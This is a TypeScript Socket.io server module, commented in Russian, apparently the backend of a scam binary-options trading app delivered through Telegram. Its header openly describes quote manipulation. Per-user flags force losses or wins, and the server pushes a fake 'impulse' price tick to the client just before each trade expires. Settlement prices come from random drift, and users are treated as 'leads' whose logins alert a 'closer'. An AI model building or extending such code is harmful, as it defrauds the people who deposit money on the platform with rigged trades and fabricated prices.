// ─── Socket.io Server — реалтайм-обновления, манипуляция котировок, admin cmds
//
// Events (server → client):
//   BALANCE_UPDATE, BINARY_RESULT, BINARY_PLACED, WITHDRAWAL_REJECTED,
//   NEW_SUPPORT_MESSAGE, FORCE_LOGOUT, FORCE_RELOAD, SHOW_MODAL,
//   UPDATE_KYC, TICK_OVERRIDE
//
// Events (client → server):
//   AUTH, PLACE_BINARY, LOG_EVENT

import { Server as SocketIOServer, Socket } from "socket.io";
import type { Server as HTTPServer } from "http";
import { createHmac } from "crypto";
import { prisma } from "../lib/prisma";

let io: SocketIOServer | null = null;

// userId → Set<socketId>
const userSockets = new Map<string, Set<string>>();
// socketId → userId
const socketUser  = new Map<string, string>();

// ─── Rate limiter (per-socket) ────────────────────────────────────────────────

const rateLimits = new Map<string, { count: number; resetAt: number }>();
const RATE_WINDOW = 10_000; // 10 sec
const RATE_MAX    = 15;     // max 15 events per window

function checkRate(socketId: string): boolean {
  const now = Date.now();
  let entry = rateLimits.get(socketId);
  if (!entry || now >= entry.resetAt) {
    entry = { count: 0, resetAt: now + RATE_WINDOW };
    rateLimits.set(socketId, entry);
  }
  entry.count++;
  return entry.count <= RATE_MAX;
}

// ─── Active trade timers (tradeId → timeout handle) ──────────────────────────

const tradeTimers = new Map<string, ReturnType<typeof setTimeout>>();

// ─── Инициализация ────────────────────────────────────────────────────────────

export function initSocketIO(httpServer: HTTPServer): SocketIOServer {
  io = new SocketIOServer(httpServer, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    path: "/ws",
    transports: ["websocket", "polling"],
  });

  io.on("connection", (socket: Socket) => {
    console.log(`[WS] connected: ${socket.id}`);

    // ── Авторизация по initData ────────────────────────────────────────────
    socket.on("AUTH", async (payload: { initData: string }) => {
      try {
        console.log(`[WS] AUTH attempt: ${socket.id}, initData length=${payload.initData?.length ?? 0}`);
        if (!payload.initData) {
          console.log(`[WS] AUTH FAIL: empty initData for ${socket.id}`);
          socket.emit("AUTH_ERROR", { error: "No initData" });
          socket.disconnect();
          return;
        }
        const userId = await authenticateSocket(payload.initData);
        if (!userId) {
          console.log(`[WS] AUTH FAIL: invalid initData for ${socket.id}`);
          socket.emit("AUTH_ERROR", { error: "Invalid initData" });
          socket.disconnect();
          return;
        }

        // Сохраняем связь socket ↔ user
        socketUser.set(socket.id, userId);
        if (!userSockets.has(userId)) userSockets.set(userId, new Set());
        userSockets.get(userId)!.add(socket.id);

        socket.join(`user:${userId}`);
        socket.emit("AUTH_OK", { userId });
        console.log(`[WS] AUTH OK: ${socket.id} → ${userId}`);

        // Снайпер: уведомляем клоузера о входе лида
        const { logEvent } = await import("../services/eventLogger");
        await logEvent(userId, "APP_OPEN", {});

        // Обновляем last_seen
        await prisma.user.update({ where: { id: userId }, data: { last_seen: new Date() } }).catch(() => null);
      } catch (e) {
        console.error(`[WS] AUTH exception for ${socket.id}:`, (e as Error).message);
        socket.emit("AUTH_ERROR", { error: "Auth failed" });
        socket.disconnect();
      }
    });

    // ── Событие: размещение бинарки ────────────────────────────────────────
    socket.on("PLACE_BINARY", async (data: {
      symbol: string; direction: "CALL" | "PUT";
      amount: number; entryPrice: number; expiryMs: number;
    }) => {
      const userId = socketUser.get(socket.id);
      if (!userId) { socket.emit("ERROR", { error: "Not authenticated" }); return; }

      // Rate limit
      if (!checkRate(socket.id)) {
        socket.emit("ERROR", { error: "Rate limit exceeded. Try again later." });
        return;
      }

      // ── Anti-tamper: проверяем баланс на сервере ──────────────────────────
      const usdtAsset = await prisma.asset.findUnique({
        where: { user_id_symbol: { user_id: userId, symbol: "USDT" } },
      });
      const serverBalance = Number(usdtAsset?.available ?? 0);
      if (data.amount > serverBalance) {
        socket.emit("ERROR", { error: "Balance mismatch — operation denied" });
        // Алерт супер-админу
        await notifySuperAdmin(userId, "TAMPER_ATTEMPT", { 
          clientAmount: data.amount, serverBalance, action: "PLACE_BINARY" 
        });
        return;
      }

      const { placeBinaryTrade, settleBinaryTrade } = await import("../services/tradeService");
      const result = await placeBinaryTrade({ userId, ...data });
      socket.emit("BINARY_PLACED", result);

      if (!result.ok || !result.tradeId) return;

      // Логируем событие
      const { logEvent } = await import("../services/eventLogger");
      await logEvent(userId, "TRADE_OPEN", {
        symbol: data.symbol, direction: data.direction, amount: data.amount,
      });

      const tradeId   = result.tradeId;
      const expiryMs  = data.expiryMs;

      // ─── IMPULSE CANDLE: за 2 сек до экспирации шлём TICK_OVERRIDE ────────
      const user = await prisma.user.findUnique({ where: { id: userId } });
      const scenario = user?.always_lose ? "LOSS"
        : user?.next_trade_result !== "AUTO" ? user?.next_trade_result
        : user?.trade_scenario === "FORCE_LOSS" ? "LOSS"
        : user?.trade_scenario === "FORCE_WIN" ? "WIN"
        : "AUTO";

      if (scenario !== "AUTO" && expiryMs > 3000) {
        // За 2 секунды до конца — подменяем тик
        const tickDelay = Math.max(expiryMs - 2000, expiryMs * 0.85);
        setTimeout(() => {
          const entryPrice = data.entryPrice;
          // Рассчитываем «импульсную» цену
          const offset = entryPrice * (0.0005 + Math.random() * 0.0005); // 0.05-0.1%
          let impulsePrice: number;
          if (scenario === "LOSS") {
            impulsePrice = data.direction === "CALL"
              ? entryPrice - offset   // CALL → цена ниже = лосс
              : entryPrice + offset;  // PUT  → цена выше = лосс
          } else {
            impulsePrice = data.direction === "CALL"
              ? entryPrice + offset   // CALL → цена выше = вин
              : entryPrice - offset;  // PUT  → цена ниже = вин
          }

          emitToUser(userId, "TICK_OVERRIDE", {
            tradeId,
            symbol: data.symbol,
            price: impulsePrice,
            direction: scenario === "LOSS" ? (data.direction === "CALL" ? "down" : "up") : (data.direction === "CALL" ? "up" : "down"),
          });
        }, tickDelay);
      }

      // ─── Settlement по истечении экспирации ────────────────────────────────
      const timer = setTimeout(async () => {
        tradeTimers.delete(tradeId);
        try {
          const drift = (Math.random() - 0.5) * 0.01;
          const marketPrice = data.entryPrice * (1 + drift);
          const settleResult = await settleBinaryTrade(tradeId, marketPrice);

          emitToUser(userId, "BINARY_RESULT", settleResult);

          // Обновляем баланс
          const assets = await prisma.asset.findMany({ where: { user_id: userId } });
          emitToUser(userId, "BALANCE_UPDATE", {
            balances: assets.map(a => ({
              symbol: a.symbol, available: Number(a.available), locked: Number(a.locked),
            })),
          });

          await logEvent(userId, "TRADE_CLOSE", {
            tradeId, status: settleResult.status, pnl: settleResult.pnl,
          });
        } catch (e) {
          console.error("[WS] Settlement error:", (e as Error).message);
        }
      }, expiryMs);

      tradeTimers.set(tradeId, timer);
    });

    // ── Событие: логирование действий ──────────────────────────────────────
    socket.on("LOG_EVENT", async (data: { event: string; meta?: Record<string, unknown> }) => {
      const userId = socketUser.get(socket.id);
      if (!userId) return;
      if (!checkRate(socket.id)) return;
      const { logEvent } = await import("../services/eventLogger");
      await logEvent(userId, data.event as any, data.meta);
    });

    // ── Disconnect ─────────────────────────────────────────────────────────
    socket.on("disconnect", () => {
      const userId = socketUser.get(socket.id);
      if (userId) {
        const sockets = userSockets.get(userId);
        sockets?.delete(socket.id);
        if (sockets?.size === 0) userSockets.delete(userId);
      }
      socketUser.delete(socket.id);
      rateLimits.delete(socket.id);
      console.log(`[WS] disconnected: ${socket.id}`);
    });
  });

  return io;
}

// ─── Отправить событие конкретному пользователю ───────────────────────────────

export function emitToUser(userId: string, event: string, data: unknown): void {
  if (!io) return;
  io.to(`user:${userId}`).emit(event, data);
}

// ─── Отправить всем подключённым ──────────────────────────────────────────────

export function emitToAll(event: string, data: unknown): void {
  if (!io) return;
  io.emit(event, data);
}

// ─── Admin-команды: FORCE_RELOAD, SHOW_MODAL, UPDATE_KYC ─────────────────────

export function adminForceReload(userId: string): void {
  emitToUser(userId, "FORCE_RELOAD", {});
}

export function adminShowModal(userId: string, title: string, text: string, type: "info" | "error" | "warning" = "info"): void {
  emitToUser(userId, "SHOW_MODAL", { title, text, type });
}

export function adminUpdateKyc(userId: string, kycStatus: string): void {
  emitToUser(userId, "UPDATE_KYC", { kycStatus });
}

// ─── Broadcast (SuperAdmin → все лиды) ────────────────────────────────────────

export function broadcastMessage(title: string, text: string): void {
  emitToAll("SHOW_MODAL", { title, text, type: "info" });
}

// ─── Anti-tamper: уведомить супер-админа ──────────────────────────────────────

async function notifySuperAdmin(userId: string, reason: string, meta: Record<string, unknown>): Promise<void> {
  try {
    const [user, sa] = await Promise.all([
      prisma.user.findUnique({ where: { id: userId } }),
      prisma.admin.findFirst({ where: { role: "SUPER_ADMIN", is_active: true } }),
    ]);
    if (!sa || !user) return;

    const { getBotInstance } = await import("../bot/relay");
    const bot = getBotInstance();
    await bot.api.sendMessage(
      String(sa.tg_id),
      [
        `⚠️ <b>SECURITY ALERT</b>`,
        `Reason: <code>${reason}</code>`,
        `👤 ${user.first_name ?? "—"} (@${user.username ?? "—"}) [${user.tg_id}]`,
        `📋 ${JSON.stringify(meta)}`,
      ].join("\n"),
      { parse_mode: "HTML" }
    ).catch(() => null);
  } catch (e) {
    console.error("[anti-tamper] notify error:", (e as Error).message);
  }
}

// ─── Аутентификация socket по initData ────────────────────────────────────────

async function authenticateSocket(rawInitData: string): Promise<string | null> {
  const botToken = process.env.BOT_TOKEN;
  if (!botToken) { console.error("[WS] AUTH: no BOT_TOKEN"); return null; }

  const params = new URLSearchParams(rawInitData);
  const hash   = params.get("hash");
  if (!hash) { console.log("[WS] AUTH: no hash in initData"); return null; }

  params.delete("hash");
  const dataCheckString = [...params.entries()]
    .sort(([a], [b]) => a.localeCompare(b))
    .map(([k, v]) => `${k}=${v}`)
    .join("\n");

  const secretKey = createHmac("sha256", "WebAppData").update(botToken).digest();
  const expectedHash = createHmac("sha256", secretKey).update(dataCheckString).digest("hex");

  if (expectedHash !== hash) { console.log("[WS] AUTH: HMAC mismatch"); return null; }

  const userRaw = params.get("user");
  if (!userRaw) { console.log("[WS] AUTH: no user in initData"); return null; }
  const tgUser = JSON.parse(userRaw) as { id: number };
  console.log(`[WS] AUTH: tg_id=${tgUser.id}`);

  // Retry once on stale Neon connection
  let user;
  try {
    user = await prisma.user.findUnique({ where: { tg_id: BigInt(tgUser.id) } });
  } catch {
    await prisma.$connect();
    user = await prisma.user.findUnique({ where: { tg_id: BigInt(tgUser.id) } });
  }

  if (!user) { console.log(`[WS] AUTH: user not found for tg_id=${tgUser.id}`); }
  return user?.id ?? null;
}

export function getIO(): SocketIOServer | null { return io; }
